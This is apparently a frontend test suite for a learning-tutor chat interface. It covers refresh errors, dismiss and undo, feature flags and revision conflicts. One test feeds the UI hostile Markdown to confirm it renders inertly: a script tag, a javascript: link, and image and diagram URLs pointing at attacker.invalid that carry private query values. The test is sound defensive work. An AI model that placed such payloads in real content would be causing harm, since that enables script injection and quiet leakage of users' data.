import { fireEvent, render, screen, waitFor } from "@testing-library/react";
import { HttpResponse, http } from "msw";
import { describe, expect, it } from "vitest";
import { API_V1_BASE } from "../lib/api";
import type { LearningOperationRequest } from "../lib/learning-tutor-types";
import { learnerUser } from "../mocks/handlers";
import { learningCard, learningFake, learningReceipt } from "../mocks/learning-tutor";
import { server } from "../mocks/server";
import { App } from "./app";

function enabled(analyst = true) {
  server.use(
    http.get(`${API_V1_BASE}/auth/session`, () =>
      HttpResponse.json({
        authenticated: true,
        provider: "keycloak",
        user: { ...learnerUser, feature_flags: { learning_tutor: true, analyst } },
      }),
    ),
  );
}
const refreshRequest = {
  request_id: "22222222-2222-4222-8222-222222222222",
  kind: "refresh" as const,
  revision: 0,
  epoch: 0,
};
describe("Learning Tutor visual state contracts", () => {
  it.each(["provider_failed", "interrupted"])(
    "keeps durable legacy %s visible in a fresh tab",
    async (error_code) => {
      enabled();
      const fake = learningFake();
      fake.state.latest_refresh = { ...learningReceipt(refreshRequest, "failed"), error_code };
      server.use(...fake.handlers);
      window.history.pushState({}, "", "/tutor");
      render(<App />);
      await screen.findByText(/An earlier recommendation request didn't finish/);
      expect(screen.getByLabelText("Message your Tutor")).toBeEnabled();
      expect(fake.requests).toHaveLength(0);
    },
  );
  it.each(["empty", "needs_context", "unavailable", "failed"] as const)(
    "offers conversation instead of the legacy %s refresh dead end",
    async (kind) => {
      enabled();
      const fake = learningFake();
      const receipt = learningReceipt(refreshRequest, kind === "failed" ? "failed" : "succeeded");
      if (receipt.output) {
        receipt.output.outcome = kind === "needs_context" ? "needs_context" : "completed";
        receipt.output.recommendation_ids = kind === "unavailable" ? ["old"] : [];
      }
      fake.state.latest_refresh = receipt;
      server.use(...fake.handlers);
      window.history.pushState({}, "", "/tutor");
      render(<App />);
      await screen.findByLabelText("Message your Tutor");
      expect(screen.queryByText(/Nothing useful to add|Refresh failed/)).toBeNull();
      expect(
        screen.queryByRole("button", { name: /Refresh recommendations|Find directions/ }),
      ).toBeNull();
      expect(fake.requests).toHaveLength(0);
    },
  );
  it("keeps prior cards on failed refresh and immediate Undo without a dismissed list", async () => {
    enabled();
    const fake = learningFake();
    fake.state.recommendations = [learningCard()];
    fake.state.latest_refresh = learningReceipt(refreshRequest, "failed");
    server.use(...fake.handlers);
    render(<App />);
    await screen.findByTestId("learning-recommendation");
    fireEvent.click(screen.getByRole("button", { name: "Not interested" }));
    await screen.findByText("Recommendation dismissed.");
    expect(screen.getByRole("button", { name: "Undo" })).toHaveFocus();
    expect(screen.queryByText("Dismissed recommendations")).toBeNull();
    expect(screen.queryByText(/Restore one below/)).toBeNull();
    fireEvent.click(screen.getByRole("button", { name: "Undo" }));
    await screen.findByTestId("learning-recommendation");
    expect(fake.state.recommendations).toHaveLength(1);
    fireEvent.click(screen.getByRole("button", { name: "Not interested" }));
    await screen.findByText("Recommendation dismissed.");
    fireEvent.click(screen.getByRole("link", { name: "Tutor" }));
    await screen.findByLabelText("Message your Tutor");
    expect(screen.queryByTestId("learning-recommendation")).toBeNull();
    expect(screen.queryByText("Dismissed recommendations")).toBeNull();
    expect(fake.dismissed).toHaveLength(1);
  });
  it("does not describe a new turn's published card as preserved from a failed refresh", async () => {
    enabled();
    const fake = learningFake();
    fake.state.latest_refresh = learningReceipt(refreshRequest, "failed");
    server.use(...fake.handlers);
    server.use(
      http.post(`${API_V1_BASE}/learning-tutor/operations`, async ({ request }) => {
        const body = (await request.json()) as LearningOperationRequest;
        const turn = learningReceipt(body);
        turn.started_at = "2026-10-23T12:01:58Z";
        turn.finished_at = "2026-10-23T12:02:00Z";
        fake.receipts.set(turn.id, turn);
        fake.state.history.items = [turn];
        fake.state.recommendations = [
          { ...learningCard(), created_at: "2026-10-23T08:01:59-04:00" },
        ];
        fake.state.revision++;
        return HttpResponse.json(turn);
      }),
    );
    window.history.pushState({}, "", "/tutor");
    render(<App />);
    await screen.findByLabelText("Message your Tutor");
    fireEvent.change(screen.getByLabelText("Message your Tutor"), {
      target: { value: "Suggest a complementary path" },
    });
    fireEvent.click(screen.getByRole("button", { name: "Send" }));
    await screen.findByTestId("learning-recommendation");
    expect(screen.queryByText(/Refresh failed\./)).toBeNull();
  });
  it.each([
    { label: "earlier", created_at: "2026-10-23T12:00:00Z", hidden: false },
    { label: "equal", created_at: "2026-10-23T12:00:01Z", hidden: false },
    { label: "newer but hidden", created_at: "2026-10-23T12:00:02Z", hidden: true },
  ])("keeps $label legacy cards subject to feature gates", async ({ created_at, hidden }) => {
    enabled(!hidden);
    const fake = learningFake();
    fake.state.latest_refresh = learningReceipt(refreshRequest, "failed");
    fake.state.recommendations = [{ ...learningCard(hidden ? "beat" : "path"), created_at }];
    server.use(...fake.handlers);
    render(<App />);
    await screen.findByRole("link", { name: "Chat with your Tutor" });
    expect(screen.queryAllByTestId("learning-recommendation")).toHaveLength(hidden ? 0 : 1);
    expect(screen.queryByText(/Refresh failed/)).toBeNull();
  });
  it("renders unsafe Markdown inertly and hides Beat actions with analyst off", async () => {
    enabled(false);
    const fake = learningFake();
    const turn = learningReceipt({ ...refreshRequest, kind: "turn", content: "Interest" });
    if (turn.output) {
      turn.output.reply = [
        "<script>alert(1)</script> [bad](javascript:alert(1))",
        "![Private diagram](https://attacker.invalid/pixel?focus=private-focus)",
        "![Reference image][tracking]",
        "[tracking]: //attacker.invalid/pixel?history=private-history",
        "[Read more](https://example.com/learning)",
        "```mermaid",
        "flowchart TD",
        '  A@{ img: "https://attacker.invalid/diagram?focus=private-focus", label: "Private diagram" }',
        "```",
      ].join("\n\n");
      turn.output.existing_work = [
        { kind: "beat", supplied_target_key: "beat:11111111-1111-4111-8111-111111111111" },
      ];
    }
    fake.state.history.items = [turn];
    fake.state.recommendations = [learningCard("beat")];
    server.use(...fake.handlers);
    window.history.pushState({}, "", "/tutor");
    const { container } = render(<App />);
    await screen.findByTestId("learning-turn");
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector('a[href^="javascript:"]')).toBeNull();
    const renderedTurn = screen.getByTestId("learning-turn");
    expect(renderedTurn.querySelector("img, svg, image, iframe, object, embed")).toBeNull();
    expect(renderedTurn.querySelector('[data-testid="mermaid-diagram"]')).toBeNull();
    expect(renderedTurn).toHaveTextContent("Private diagram");
    expect(renderedTurn).toHaveTextContent("Reference image");
    expect(renderedTurn.querySelector("pre code")).toHaveTextContent(
      'A@{ img: "https://attacker.invalid/diagram?focus=private-focus"',
    );
    expect(screen.getByRole("link", { name: "Read more" })).toHaveAttribute(
      "href",
      "https://example.com/learning",
    );
    expect(screen.getByRole("link", { name: "Read more" })).toHaveAttribute(
      "rel",
      "noopener noreferrer",
    );
    expect(screen.queryByText("Explore Beat")).toBeNull();
    expect(screen.queryByText("Open Beat")).toBeNull();
  });
  it("retains typed input on a revision conflict without submitting against unseen state", async () => {
    enabled();
    const fake = learningFake();
    server.use(...fake.handlers);
    window.history.pushState({}, "", "/tutor");
    render(<App />);
    const input = await screen.findByLabelText("Message your Tutor");
    fireEvent.change(input, { target: { value: "Keep this question" } });
    fake.state.revision++;
    fireEvent.click(screen.getByRole("button", { name: "Send" }));
    await screen.findByText(/Your learning context changed/);
    expect(input).toHaveValue("Keep this question");
    expect(fake.requests).toHaveLength(0);
    fireEvent.click(screen.getByRole("button", { name: "Send" }));
    await waitFor(() => expect(fake.requests).toHaveLength(1));
  });
});
